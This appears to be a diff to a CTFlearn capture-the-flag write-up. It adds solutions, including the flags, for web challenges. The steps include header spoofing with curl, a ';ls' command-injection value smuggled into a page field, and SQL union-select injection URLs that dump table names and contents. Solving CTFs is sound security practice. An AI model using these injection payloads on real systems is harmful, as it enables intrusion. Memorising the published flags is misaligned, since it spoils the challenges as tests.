@@ -173,10 +173,41 @@
     - Execute curl -X POST -F 'username=admin' -F 'password=71urlkufpsdnlkadsf' http://165.227.106.113/post.php
     - Get the flag from the response
 
+## [Don't Bump Your Head(er)](https://ctflearn.com/challenge/109)
+
+### Solution: CTFlearn{did_this_m3ss_with_y0ur_h34d}
+
+### Steps to reproduce
+
+    - Install curl
+    - Run curl -A "Sup3rS3cr3tAg3nt" -H "Referer: awesomesauce.com" http://165.227.106.113/header.php
+    - Get the flag from the response
+
+## [Calculat3 M3](https://ctflearn.com/challenge/150)
+
+### Solution: CTFlearn{watch_0ut_f0r_th3_m0ng00s3}
+
+### Steps to reproduce
+
+    - Visit https://web.ctflearn.com/web7/
+    - In the dev tools console enter document.getElementById("d").value = ";ls";
+    - Basic web command injection
+    - Press the equal sign
+    - Get the flag from the page
+
+## [Inj3ction Time](https://ctflearn.com/challenge/149)
+
+### Solution: abctf{uni0n_1s_4_gr34t_c0mm4nd}
+
+### Steps to reproduce
+
+    - Visit https://web.ctflearn.com/web8/?id=1+union+select+table_name,0x02,0x03,0x04%20from%20information_schema.tables to find the vulnerable table
+
+    - Visit https://web.ctflearn.com/web8/?id=1+union+select+(SELECT+*+from+w0w_y0u_f0und_m3),0x02,0x03,0x04 to get the flag
+  
 ## [Where Can My Robot Go?](https://ctflearn.com/challenge/107)
 
 ### Solution: CTFlearn{r0b0ts_4r3_th3_futur3}
-
 ### Steps to reproduce
 
     - Visit https://ctflearn.com/robots.txt
